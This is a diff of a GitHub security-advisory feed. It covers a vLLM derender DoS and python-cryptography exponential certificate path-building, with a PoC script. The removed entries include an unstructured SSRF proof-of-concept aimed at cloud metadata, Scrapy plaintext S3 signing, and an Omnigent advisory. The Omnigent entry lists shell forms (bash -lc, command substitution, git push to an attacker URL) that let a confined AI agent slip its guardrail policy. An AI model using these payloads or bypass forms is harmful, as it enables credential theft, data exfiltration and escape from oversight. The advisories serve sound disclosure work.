+<p>Add regression tests for both derender endpoints. The tests should show that a normal bounded derender payload succeeds, while oversized <code>generate_responses</code>, oversized <code>choices</code>, oversized <code>token_ids</code>, and oversized logprob/top-logprob structures are rejected before <code>tokenizer.decode()</code> or parser execution.</p>
+<h2 id="affected-packageversions">Affected Package/Versions</h2>
+<p>Confirmed affected: current main at <code>ddd3855a28a561a5bb54d380c6e6b8b1e883cc4a</code> and downstream/nightly builds that include the derender endpoints introduced by PR <code>#43606</code>. The derender router, request models, decode sink, render serving bridge, and OpenAI API router attachment have no relevant diff from <code>00e045b7c7b82599f626779e111233abd4d0a64e</code> to <code>ddd3855a28a561a5bb54d380c6e6b8b1e883cc4a</code>.</p>
+<p>Latest release checked: <code>v0.23.0</code>, published on <code>2026-06-15</code>. Its <code>vllm/entrypoints/serve/render/api_router.py</code> does not expose <code>/v1/completions/derender</code> or <code>/v1/chat/completions/derender</code>, so <code>v0.23.0</code> was not confirmed affected.</p>
+<h2 id="advisory-history">Advisory History</h2>
+<p>PR <code>#43606</code> ("[Render] Add <code>/derender</code> endpoints for disaggregated postprocessing") introduced the derender endpoints on main. PR <code>#44285</code> later refactored the render serving code, and current head still contains the unchecked derender flow.</p>
+<p>Public issue search for <code>derender GenerateResponse token_ids</code> returned no reports. Public search for <code>"/v1/completions/derender"</code> returned the derender feature RFC <code>#42729</code> and unrelated bugs, but no size-bound, DoS, or generated-output postprocessing issue.</p>
+<p>Related public request-fanout and resource-bound advisories are distinct:</p>
+<ul>
+<li><code>GHSA-3mwp-wvh9-7528</code> covers an unbounded <code>n</code> parameter on the normal OpenAI completion/chat generation routes. Its root cause is missing upper-bound validation for generated sequence count, its sink is request fanout and request-object copying into the async engine path before scheduling, its precondition is a caller-controlled <code>n</code>, and its fix surface is a cap on generated sequence count. This report reaches <code>/v1/completions/derender</code> and <code>/v1/chat/completions/derender</code>, not the normal generate routes; its root cause is unchecked caller-supplied <code>GenerateResponse</code> / <code>choices</code> / <code>token_ids</code> structures, its sink is <code>OnlineDerenderer</code> detokenization and response construction after generation, its precondition is access to the derender API with generated-output-shaped JSON, and its fix surface is derender payload validation before decode.</li>
+<li>PR <code>#45390</code> includes the <code>GHSA-83mh-6mwq-3hg9</code> batch-message fanout fix class: it bounds the outer <code>BatchChatCompletionRequest.messages</code> conversation list to prevent one request from creating many conversation/request objects before normal generation. This report has no batch conversation list and does not rely on <code>n</code>; one derender request can instead supply oversized nested <code>GenerateResponse</code> choices and token IDs that are detokenized and returned directly. A batch-message <code>max_length</code> limit would not bound derender <code>generate_response(s)</code> or per-choice token/logprob structures.</li>
+</ul>
+<p>The completed local report titled "Explicit truncation_side disables tokenizer-level prompt truncation" is also distinct. That report used <code>/v1/completions</code> and <code>/v1/chat/completions</code> with ordinary prompt text plus <code>truncate_prompt_tokens</code> and explicit <code>truncation_side</code>; its root cause was the renderer omitting tokenizer-level <code>max_length</code> and the pre-tokenization character guard before post-token slicing; its sink was prompt tokenization; and its fix surface was preserving tokenizer-level truncation or rejecting over-budget prompts before tokenization. This derender report uses <code>/v1</code> derender routes, has no prompt text tokenization or truncation-side control, starts from caller-supplied generated-output token IDs, and needs aggregate bounds on derender <code>generate_response(s)</code>, choices, token IDs, logprobs, parser inputs, and response construction before detokenization.</p>
+<p>Other adjacent vLLM advisories for Rust/gRPC token-id and logprob bounds, structured-output grammar amplification, repetition-detection windows, and pooling/rerank batch fanout are distinct. Those issues affect Rust/gRPC request conversion, grammar compilation, scheduler loops, or engine fanout. This issue affects <code>/v1</code> derender postprocessing of caller-supplied generated-output objects and requires derender-specific request validation before detokenization.</p>
+<h2 id="resources">Resources</h2>
+<ul>
+<li><code>vllm/entrypoints/serve/render/api_router.py</code></li>
+<li><code>vllm/entrypoints/serve/disagg/protocol.py</code></li>
+<li><code>vllm/renderers/online_derenderer.py</code></li>
+<li><code>vllm/entrypoints/serve/render/serving.py</code></li>
+<li><code>vllm/entrypoints/openai/api_server.py</code></li>
+<li>PR <code>#43606</code>: <code>https://github.com/vllm-project/vllm/pull/43606</code></li>
+<li>PR <code>#44285</code>: <code>https://github.com/vllm-project/vllm/pull/44285</code></li>
+<li><code>GHSA-3mwp-wvh9-7528</code>: <code>https://github.com/vllm-project/vllm/security/advisories/GHSA-3mwp-wvh9-7528</code></li>
+<li>PR <code>#45390</code>: <code>https://github.com/vllm-project/vllm/pull/45390</code></li>
+<li>Release <code>v0.23.0</code>: <code>https://github.com/vllm-project/vllm/releases/tag/v0.23.0</code></li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-8737-qx52-hjff">https://github.com/vllm-project/vllm/security/advisories/GHSA-8737-qx52-hjff</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-71486">https://nvd.nist.gov/vuln/detail/CVE-2026-71486</a></li>
+<li><a href="https://github.com/vllm-project/vllm/pull/47260">https://github.com/vllm-project/vllm/pull/47260</a></li>
+<li><a href="https://github.com/vllm-project/vllm/commit/8e61b646e2d157f9b93451fa048f9c8530c8a67b">https://github.com/vllm-project/vllm/commit/8e61b646e2d157f9b93451fa048f9c8530c8a67b</a></li>
+<li><a href="https://github.com/vllm-project/vllm/releases/tag/v0.26.0">https://github.com/vllm-project/vllm/releases/tag/v0.26.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-8737-qx52-hjff">https://github.com/advisories/GHSA-8737-qx52-hjff</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-8737-qx52-hjff</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-09-04T21:32:07.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[cryptography] python-cryptography: Duplicate self-signed intermediates can cause exponential path-building]]></title>
+        <id>https://github.com/advisories/GHSA-jwv3-5hgf-82ww</id>
+        <link href="https://github.com/advisories/GHSA-jwv3-5hgf-82ww"/>
+        <updated>2026-09-04T21:19:51.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>When resolving invalid certificate chains that include duplicate copies of self-signed certificates, the processing recursively invokes the same candidate, leading to an exponential blowup. Although the limitation that the chain depth cannot exceed a specified maximum depth prevents unbounded recursion and guarantees termination, an attacker-controlled certificate chain can lead the processing to easily take more than 5s to reject in testing. This amplification could form the basis for a resource exhaustion denial of service attack.</p>
+<p>This work was completed by Trail of Bits as part of the Patch The Planet project in collaboration with OpenAI. The finding was identified primarily by the Codex coding agent, and manually reviewed before submission. </p>
+<h3 id="details">Details</h3>
+<p>The core issue arises in the recursive nature of <code>build_chain_inner</code>, which does not de-duplicate against previously analyzed candidates.</p>
+<pre><code class="language-python">    fn build_chain_inner(
+        &amp;self,
+        working_cert: &amp;VerificationCertificate&lt;'chain, B&gt;,
+        current_depth: u8,
+        working_cert_extensions: &amp;Extensions&lt;'chain&gt;,
+        name_chain: NameChain&lt;'_, 'chain&gt;,
+        budget: &amp;mut Budget,
+    ) -&gt; ValidationResult&lt;'chain, Chain&lt;'chain, B&gt;, B&gt; {
+        if let Some(nc) = working_cert_extensions.get_extension(&amp;NAME_CONSTRAINTS_OID) {
+            name_chain.evaluate_constraints(&amp;nc.value()?, budget)?;
+        }
+
+        // Look in the store's root set to see if the working cert is listed.
+        // If it is, we've reached the end.
+        if self.store.contains(working_cert) {
+            return Ok(vec![working_cert.clone()]);
+        }
+
+        // Check that our current depth does not exceed our policy-configured
+        // max depth. We do this after the root set check, since the depth
+        // only measures the intermediate chain's length, not the root or leaf.
+        if current_depth &gt; self.policy.max_chain_depth {
+            return Err(ValidationError::new(ValidationErrorKind::Other(
+                "chain construction exceeds max depth".into(),
+            )));
+        }
+
+        // Otherwise, we collect a list of potential issuers for this cert,
+        // and continue with the first that verifies.
+        let mut last_err: Option&lt;ValidationError&lt;'_, B&gt;&gt; = None;
+        for issuing_cert_candidate in self.potential_issuers(working_cert) {
+            // A candidate issuer is said to verify if it both
+            // signs for the working certificate and conforms to the
+            // policy.
+            let issuer_extensions = issuing_cert_candidate.certificate().extensions()?;
+            match self.policy.valid_issuer(
+                issuing_cert_candidate,
+                working_cert,
+                current_depth,
+                &amp;issuer_extensions,
+            ) {
+                Ok(_) =&gt; {
+                    match self.build_chain_inner(
+</code></pre>
+<p>A sufficient patch is to track valid issuers, and to skip seen ones before recursing. By tracking valid issuers only, validation and custom extension-policy callbacks still run.</p>
+<pre><code class="language-rust">          let mut seen_valid_issuers = Vec::&lt;&amp;VerificationCertificate&lt;'chain, B&gt;&gt;::new();
+          for issuing_cert_candidate in self.potential_issuers(working_cert) {
+          . . .
+                  Ok(_) =&gt; {
+                      if seen_valid_issuers.contains(&amp;issuing_cert_candidate) {
+                         continue;
+                      }
+                      seen_valid_issuers.push(issuing_cert_candidate);
+ 
+                      match self.build_chain_inner(
+                          issuing_cert_candidate,
+                          // NOTE(ww): According to RFC 5280, we should only
+</code></pre>
+<p>In testing, this fix removed the exponential blowup without breaking apparent correctness. </p>
+<pre><code>duplicates,max_depth,result,seconds
+1,7,rejected,0.000464 -&gt; 1,7,rejected,0.000667
+2,7,rejected,0.025154 -&gt; 2,7,rejected,0.001229
+3,7,rejected,0.489924 -&gt; 3,7,rejected,0.001619 
+4,7,rejected,4.309403 -&gt; 4,7,rejected,0.002144
+3,8,rejected,1.468193 -&gt; 3,8,rejected,0.001811
+4,8,timeout&gt;5s,       -&gt; 4,8,rejected,0.002410
+5,7,timeout&gt;5s,       -&gt; 5,7,rejected,0.002640
+6,6,timeout&gt;5s,       -&gt; 6,6,rejected,0.002829
+</code></pre>
+<h3 id="poc">PoC</h3>
+<p>The following script benchmarks processing times for malicious cert chains.</p>
+<pre><code class="language-python">import datetime
+import multiprocessing
+import time
+
+import cryptography
+from cryptography import x509
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.asymmetric import ec
+from cryptography.x509.oid import ExtendedKeyUsageOID, NameOID
+from cryptography.x509.verification import (
+    DNSName,
+    PolicyBuilder,
+    Store,
+    VerificationError,
+)
+
+NOW = datetime.datetime(2024, 1, 1, tzinfo=datetime.timezone.utc)
+TIMEOUT = 5
+CA_KEY_USAGE = x509.KeyUsage(
+    digital_signature=True,
+    content_commitment=False,
+    key_encipherment=False,
+    data_encipherment=False,
+    key_agreement=False,
+    key_cert_sign=True,
+    crl_sign=True,
+    encipher_only=False,
+    decipher_only=False,
+)
+EE_KEY_USAGE = x509.KeyUsage(
+    digital_signature=True,
+    content_commitment=False,
+    key_encipherment=False,
+    data_encipherment=False,
+    key_agreement=False,
+    key_cert_sign=False,
+    crl_sign=False,
+    encipher_only=False,
+    decipher_only=False,
+)
+
+def name(common_name):
+    return x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, common_name)])
+
+def base_builder(subject, issuer, public_key, serial):
+    return (
+        x509.CertificateBuilder()
+        .subject_name(subject)
+        .issuer_name(issuer)
+        .public_key(public_key)
+        .serial_number(serial)
+        .not_valid_before(NOW - datetime.timedelta(days=1))
+        .not_valid_after(NOW + datetime.timedelta(days=30))
+    )
+
+def make_ca(common_name, serial):
+    private_key = ec.generate_private_key(ec.SECP256R1())
+    subject = name(common_name)
+    cert = (
+        base_builder(subject, subject, private_key.public_key(), serial)
+        .add_extension(x509.BasicConstraints(ca=True, path_length=None), True)
+        .add_extension(CA_KEY_USAGE, True)
+        .add_extension(
+            x509.SubjectKeyIdentifier.from_public_key(private_key.public_key()),
+            False,
+        )
+        .sign(private_key, hashes.SHA256())
+    )
+    return private_key, cert
+
+def make_leaf(issuer_key, issuer_cert):
+    private_key = ec.generate_private_key(ec.SECP256R1())
+    return (
+        base_builder(name("leaf"), issuer_cert.subject, private_key.public_key(), 100)
+        .add_extension(x509.BasicConstraints(ca=False, path_length=None), True)
+        .add_extension(EE_KEY_USAGE, True)
+        .add_extension(x509.SubjectAlternativeName([x509.DNSName("example.com")]), False)
+        .add_extension(
+            x509.AuthorityKeyIdentifier.from_issuer_public_key(issuer_key.public_key()),
+            False,
+        )
+        .add_extension(x509.ExtendedKeyUsage([ExtendedKeyUsageOID.SERVER_AUTH]), False)
+        .sign(issuer_key, hashes.SHA256())
+    )
+
+def build_material():
+    looping_key, looping_ca = make_ca("looping self-signed CA", 1)
+    _, unrelated_root = make_ca("unrelated trust anchor", 2)
+    leaf = make_leaf(looping_key, looping_ca)
+    return leaf, looping_ca, unrelated_root
+
+def verify_case(duplicates, max_depth, queue):
+    leaf, looping_ca, unrelated_root = build_material()
+    verifier = (
+        PolicyBuilder()
+        .store(Store([unrelated_root]))
+        .time(NOW)
+        .max_chain_depth(max_depth)
+        .build_server_verifier(DNSName("example.com"))
+    )
+
+    start = time.perf_counter()
+    try:
+        verifier.verify(leaf, [looping_ca] * duplicates)
+        result = "accepted"
+    except VerificationError:
+        result = "rejected"
+    queue.put((result, time.perf_counter() - start))
+
+def run_case(duplicates, max_depth):
+    queue = multiprocessing.Queue()
+    process = multiprocessing.Process(
+        target=verify_case,
+        args=(duplicates, max_depth, queue),
+    )
+    process.start()
+    process.join(TIMEOUT)
+
+    if process.is_alive():
+        process.terminate()
+        process.join()
+        print(f"{duplicates},{max_depth},timeout&gt;{TIMEOUT}s,")
+        return
+
+    result, elapsed = queue.get()
+    print(f"{duplicates},{max_depth},{result},{elapsed:.6f}")
+
+if __name__ == "__main__":
+    print("duplicates,max_depth,result,seconds")
+    for case in [(1, 7), (2, 7), (3, 7), (4, 7), (3, 8), (4, 8), (5, 7), (6, 6)]:
+        run_case(*case)
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>This issue exposes an amplification pathway over data that in many applications may be user-controlled, leading to the possibility of a denial of service through resource exhaustion. As the correctness of validation is not affected, the integrity of a system cannot be compromised through this vector, only its availability.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/pyca/cryptography/security/advisories/GHSA-jwv3-5hgf-82ww">https://github.com/pyca/cryptography/security/advisories/GHSA-jwv3-5hgf-82ww</a></li>
+<li><a href="https://github.com/pyca/cryptography/pull/14960">https://github.com/pyca/cryptography/pull/14960</a></li>
+<li><a href="https://github.com/pyca/cryptography/commit/4a12cf49675a184e47f912b00b04f3a629283582">https://github.com/pyca/cryptography/commit/4a12cf49675a184e47f912b00b04f3a629283582</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-69249">https://nvd.nist.gov/vuln/detail/CVE-2026-69249</a></li>
+<li><a href="https://github.com/pyca/cryptography/commit/3763aa79b">https://github.com/pyca/cryptography/commit/3763aa79b</a></li>
+<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/cryptography/PYSEC-2026-3553.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/cryptography/PYSEC-2026-3553.yaml</a></li>
+<li><a href="https://github.com/advisories/GHSA-jwv3-5hgf-82ww">https://github.com/advisories/GHSA-jwv3-5hgf-82ww</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jwv3-5hgf-82ww</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-08-03T21:26:50.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[apache-airflow] Apache Airflow exposes deferred trigger kwargs in task-instance API responses]]></title>
         <id>https://github.com/advisories/GHSA-22hf-vx2v-gjff</id>
@@ -396,277 +989,5 @@ Users should upgrade to apache-airflow 3.3.0 or later, which masks sensitive val
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-07-13T06:31:31.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[unstructured] unstructured: Server-Side Request Forgery in the URL-based partitioning]]></title>
-        <id>https://github.com/advisories/GHSA-4mvj-m6j5-pmf7</id>
-        <link href="https://github.com/advisories/GHSA-4mvj-m6j5-pmf7"/>
-        <updated>2026-09-03T17:02:48.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Server-Side Request Forgery in <code>unstructured</code>. The <code>url=</code> argument of <code>partition()</code>, <code>partition_html()</code>, and <code>partition_md()</code> is fetched via <code>requests.get()</code> with no host validation. The response body is returned as <code>Element</code> text, so this is a <strong>full-read SSRF</strong> — attackers reach loopback admin APIs, internal HTTP services, and cloud metadata endpoints, and read the response. </p>
-<p><code>unstructured</code> is the de facto URL ingestion layer for LangChain <code>UnstructuredURLLoader</code>, LlamaIndex <code>UnstructuredReader</code>, Chainlit, and many agent frameworks — secure defaults must live in the library, not in every downstream caller.</p>
-<h3 id="details">Details</h3>
-<p>Three sinks, all in <code>unstructured == 0.22.26</code> (verified on <code>main</code> at <code>199f255</code>):</p>
-<ul>
-<li><code>unstructured/partition/auto.py:303</code> — <code>file_and_type_from_url()</code>, reached via <code>partition(url=…)</code>.</li>
-<li><code>unstructured/partition/html/partition.py:160</code> — <code>partition_html(url=…)</code>. Post-fetch <code>Content-Type</code> check runs after the request hits the target.</li>
-<li><code>unstructured/partition/md.py:96</code> — <code>partition_md(url=…)</code>. No timeout (SSRF + slow-loris DoS).</li>
-</ul>
-<p>None of <code>is_private</code>, <code>is_loopback</code>, <code>ipaddress</code>, <code>gethostbyname</code>, or <code>allow_redirects</code> appear in any of the three files. Three exploitation paths apply: direct private-IP target; redirect bypass (<code>allow_redirects=True</code> default); DNS rebinding (TOCTOU, closeable only by socket-pinning). Affected since <code>0.4.7</code> (Feb 2023) — ~219 releases, no validation ever introduced.</p>
-<h3 id="poc">PoC</h3>
-<p>Local-only. <code>pip install unstructured==0.22.26 flask requests</code>.</p>
-<p><code>internal_server.py</code>:</p>
-<pre><code class="language-python">from flask import Flask, Response, jsonify
-app = Flask(__name__)
-
-@app.route("/imds")
-def imds(): return jsonify({"AccessKeyId": "ASIA-FAKE", "SecretAccessKey": "FAKE/SECRET"})
-
-@app.route("/internal.html")
-def html(): return Response("&lt;html&gt;&lt;body&gt;&lt;p&gt;SK_LEAK_42&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;", mimetype="text/html")
-
-@app.route("/redir")
-def redir(): return Response("", 302, headers={"Location": "http://127.0.0.1:9999/imds"})
-
-if __name__ == "__main__": app.run(host="127.0.0.1", port=9999)
-</code></pre>
-<p><code>exploit.py</code> — uses the public top-level API:</p>
-<pre><code class="language-python"># Stub NLP helpers so the offline sandbox skips spaCy model download.
-# Does NOT affect the SSRF (which lives in the URL fetcher, before NLP).
-import unstructured.nlp.tokenize as _tk, unstructured.partition.text_type as _tt
-_tk.sent_tokenize = _tt.sent_tokenize = lambda t: [s for s in (t or "").split(". ") if s]
-_tk.word_tokenize = _tt.word_tokenize = lambda t: (t or "").split()
-_tk.pos_tag       = _tt.pos_tag       = lambda t: [(w, "NN") for w in (t or "").split()]
-
-from unstructured.partition.auto import partition
-L = "http://127.0.0.1:9999"
-
-# A: partition(url=...) leaks internal HTML body
-assert "SK_LEAK_42" in "\n".join(str(e) for e in partition(url=f"{L}/internal.html", languages=["eng"]))
-# B: redirect bypass reaches simulated IMDS
-assert "SecretAccessKey" in "\n".join(str(e) for e in partition(url=f"{L}/redir", languages=["eng"]))
-print("PoC OK")
-</code></pre>
-<p>In production the attacker substitutes <code>169.254.169.254</code>, <code>metadata.google.internal</code>, or any internal address.</p>
-<h3 id="impact">Impact</h3>
-<p>Attacker capabilities:</p>
-<ul>
-<li><strong>Internal HTTP service read</strong> — loopback admin consoles, internal Elasticsearch/Redis/Consul/etcd HTTP fronts, Kubernetes API server, social/internal microservices. This is the most broadly exploitable capability and is unaffected by any cloud-side hardening.</li>
-<li><strong>Cloud instance metadata access</strong> — reads metadata services that respond to unauthenticated GETs: GCP (<code>metadata.google.internal</code>), Azure IMDS, Oracle Cloud, DigitalOcean, and EC2 instances still configured for IMDSv1 (which remains widely deployed in older accounts and in services that do not enforce IMDSv2-only). EC2 instances configured as IMDSv2-only are not exposed to direct credential theft via this SSRF, since IMDSv2 requires a <code>PUT</code> for token acquisition; the SSRF still reaches the endpoint for reconnaissance and surface-mapping.</li>
-<li><strong>Side-effecting GET endpoints</strong> — magic-link consumers, job triggers, link-preview generators reachable on internal networks.</li>
-<li><strong>Internal network reconnaissance</strong> — connection success/failure timing and error messages serve as a port and service scanner.</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/Unstructured-IO/unstructured/security/advisories/GHSA-4mvj-m6j5-pmf7">https://github.com/Unstructured-IO/unstructured/security/advisories/GHSA-4mvj-m6j5-pmf7</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-71428">https://nvd.nist.gov/vuln/detail/CVE-2026-71428</a></li>
-<li><a href="https://github.com/Unstructured-IO/unstructured/pull/4388">https://github.com/Unstructured-IO/unstructured/pull/4388</a></li>
-<li><a href="https://github.com/Unstructured-IO/unstructured/commit/445c95735c4045057f51f399bc04c657751923bd">https://github.com/Unstructured-IO/unstructured/commit/445c95735c4045057f51f399bc04c657751923bd</a></li>
-<li><a href="https://github.com/Unstructured-IO/unstructured/releases/tag/0.24.0">https://github.com/Unstructured-IO/unstructured/releases/tag/0.24.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-4mvj-m6j5-pmf7">https://github.com/advisories/GHSA-4mvj-m6j5-pmf7</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-4mvj-m6j5-pmf7</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-09-03T17:02:46.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[scrapy] Scrapy: S3DownloadHandler sends signed S3 requests over plaintext HTTP by default]]></title>
-        <id>https://github.com/advisories/GHSA-76g3-c3x4-crvx</id>
-        <link href="https://github.com/advisories/GHSA-76g3-c3x4-crvx"/>
-        <updated>2026-09-02T22:50:45.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="problem">Problem</h3>
-<p>Scrapy’s <code>S3DownloadHandler</code> sends signed S3 requests over plaintext HTTP by default.</p>
-<p>A normal request like <code>s3://bucket/key</code> is converted into <code>http://bucket.s3.amazonaws.com/key</code> unless <code>request.meta["is_secure"]</code> is explicitly set. The generated request is then signed with configured AWS credentials, so AWS authorization material can be sent without TLS.</p>
-<p>Vulnerable code in <code>scrapy/core/downloader/handlers/s3.py</code>:</p>
-<pre><code class="language-python">scheme = "https" if request.meta.get("is_secure") else "http"
-url = f"{scheme}://{bucket}.s3.amazonaws.com{path}"
-</code></pre>
-<p>The request is then signed and dispatched:</p>
-<pre><code class="language-python">self._signer.add_auth(awsrequest)
-request = request.replace(url=url, headers=awsrequest.headers.items())
-</code></pre>
-<h3 id="impact">Impact</h3>
-<p>Users making Scrapy <code>s3://</code> requests with AWS credentials are impacted.</p>
-<p>A network attacker able to observe traffic between Scrapy and S3, such as a public Wi-Fi attacker, compromised router, ISP/corporate network observer, or local network attacker using ARP spoofing, can read:</p>
-<pre><code class="language-text">bucket/key path
-AWS Authorization header
-X-Amz-Security-Token, if temporary credentials are used
-S3 object contents
-S3 response headers
-</code></pre>
-<p>An active MITM attacker can also modify the plaintext S3 response body, status code, and headers before Scrapy processes it. This can cause scraped data poisoning, poisoned exports, HTTP cache poisoning when cache is enabled, and influence over later crawl targets through forged redirects or attacker-controlled links.</p>
-<p>Suggested classification: <strong>CWE-319: Cleartext Transmission of Sensitive Information</strong>.</p>
-<h3 id="poc">PoC</h3>
-<p>A minimal PoC creates an <code>s3://</code> request, enables fake AWS settings, captures the request produced by <code>S3DownloadHandler</code>, and prints the rewritten URL and auth headers.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/scrapy/scrapy/security/advisories/GHSA-76g3-c3x4-crvx">https://github.com/scrapy/scrapy/security/advisories/GHSA-76g3-c3x4-crvx</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-84366">https://nvd.nist.gov/vuln/detail/CVE-2026-84366</a></li>
-<li><a href="https://github.com/scrapy/scrapy/commit/9523e1ec8c41fde265a26d14563d178b6f1ad04b">https://github.com/scrapy/scrapy/commit/9523e1ec8c41fde265a26d14563d178b6f1ad04b</a></li>
-<li><a href="https://github.com/scrapy/scrapy/releases/tag/2.17.0">https://github.com/scrapy/scrapy/releases/tag/2.17.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-76g3-c3x4-crvx">https://github.com/advisories/GHSA-76g3-c3x4-crvx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-76g3-c3x4-crvx</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-09-02T22:50:44.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[omnigent] Omnigent Guardrail policy bypass: shell-command parser fails open in policies/builtins/_shell.py]]></title>
-        <id>https://github.com/advisories/GHSA-7mqg-cx4g-x2rf</id>
-        <link href="https://github.com/advisories/GHSA-7mqg-cx4g-x2rf"/>
-        <updated>2026-09-02T22:40:09.000Z</updated>
-        <content type="html"><![CDATA[<p><strong>Reporter:</strong> Aaron / Aeon — autonomous security agent (<a href="https://github.com/aaronjmars/aeon">https://github.com/aaronjmars/aeon</a>)
-<strong>Project:</strong> <code>omnigent-ai/omnigent</code> v0.1.0 (Databricks) — meta-harness running Claude Code / Codex / Pi "in check with policies and sandboxing"
-<strong>Component:</strong> <code>omnigent/policies/builtins/_shell.py</code> (shared parser) → consumed by <code>policies/builtins/github.py</code> (<code>write_repos</code>/<code>write_branches</code> allowlist) and <code>policies/builtins/working_dir.py</code> (workspace confinement)</p>
-<h2 id="summary">Summary</h2>
-<p>The shared shell-command parser <strong>fails open</strong>. When a gated command spells something the parser doesn't recognize, it produces no operation, the policy evaluator returns <code>None</code>, and <code>None</code> = abstain = <strong>ALLOW</strong>. So any command the parser misses bypasses both the GitHub repo/branch allowlist and the working-directory confinement — the product's two core safety guarantees.</p>
-<h2 id="impact">Impact</h2>
-<p>A misaligned or prompt-injected agent that is <em>meant to be confined</em> can:</p>
-<ul>
-<li><code>git push</code> to an attacker-controlled repo (code / secret exfiltration),</li>
-<li>push to a protected branch,</li>
-<li>escape its workspace via <code>git worktree add</code> / <code>git -C &lt;other-dir&gt;</code>.</li>
-</ul>
-<h2 id="bypass-classes-all-verified-against-the-real-policy-code">Bypass classes (all verified against the real policy code)</h2>
-<ul>
-<li><strong>Combined interpreter flags:</strong> <code>bash -lc "git push &lt;attacker-url&gt;"</code></li>
-<li><strong>Unlisted wrappers:</strong> <code>timeout</code> / <code>nice</code> / <code>setsid</code> / <code>stdbuf … git push …</code></li>
-<li><strong>Command substitution:</strong> <code>x=$(git push &lt;attacker-url&gt;)</code></li>
-<li><strong>Un-split background operator:</strong> <code>true &amp; git push &lt;attacker-url&gt;</code></li>
-</ul>
-<p>Controls that <strong>correctly hold</strong> (confirming this is parser incompleteness, not an allowlist logic error): bare <code>git push &lt;attacker-url&gt;</code> and <code>env git push …</code> both <strong>DENY</strong>.</p>
-<h2 id="suggested-fix">Suggested fix</h2>
-<p>Make the gated surface <strong>fail closed</strong>:</p>
-<ol>
-<li>An unrecognized gated command must <strong>DENY</strong>, not return <code>None</code> → ALLOW. Abstain on a security gate should resolve to deny, not allow.</li>
-<li>Canonicalize known wrappers (<code>timeout</code> / <code>nice</code> / <code>setsid</code> / <code>stdbuf</code> / <code>env</code>) down to their inner command before evaluation.</li>
-<li>Recurse into <code>sh -c</code> / <code>bash -c</code> payloads and command substitutions, and split on shell control operators (<code>;</code>, <code>&amp;</code>, <code>&amp;&amp;</code>, <code>||</code>, <code>|</code>) before judging each segment.</li>
-</ol>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/omnigent-ai/omnigent/security/advisories/GHSA-7mqg-cx4g-x2rf">https://github.com/omnigent-ai/omnigent/security/advisories/GHSA-7mqg-cx4g-x2rf</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-62676">https://nvd.nist.gov/vuln/detail/CVE-2026-62676</a></li>
-<li><a href="https://github.com/omnigent-ai/omnigent/pull/389">https://github.com/omnigent-ai/omnigent/pull/389</a></li>
-<li><a href="https://github.com/omnigent-ai/omnigent/commit/1a05b7b139ef504bf2be89bf37918abe104fb95c">https://github.com/omnigent-ai/omnigent/commit/1a05b7b139ef504bf2be89bf37918abe104fb95c</a></li>
-<li><a href="https://github.com/omnigent-ai/omnigent/releases/tag/v0.3.0">https://github.com/omnigent-ai/omnigent/releases/tag/v0.3.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-7mqg-cx4g-x2rf">https://github.com/advisories/GHSA-7mqg-cx4g-x2rf</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-7mqg-cx4g-x2rf</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-09-02T22:40:07.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[omnigent] Omnigent: Unvalidated os_env.cwd in agent bundle yields arbitrary host filesystem access on runners without OMNIGENT_RUNNER_WORKSPACE]]></title>
-        <id>https://github.com/advisories/GHSA-p8rw-8qj3-hf33</id>
-        <link href="https://github.com/advisories/GHSA-p8rw-8qj3-hf33"/>
-        <updated>2026-09-02T22:00:56.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
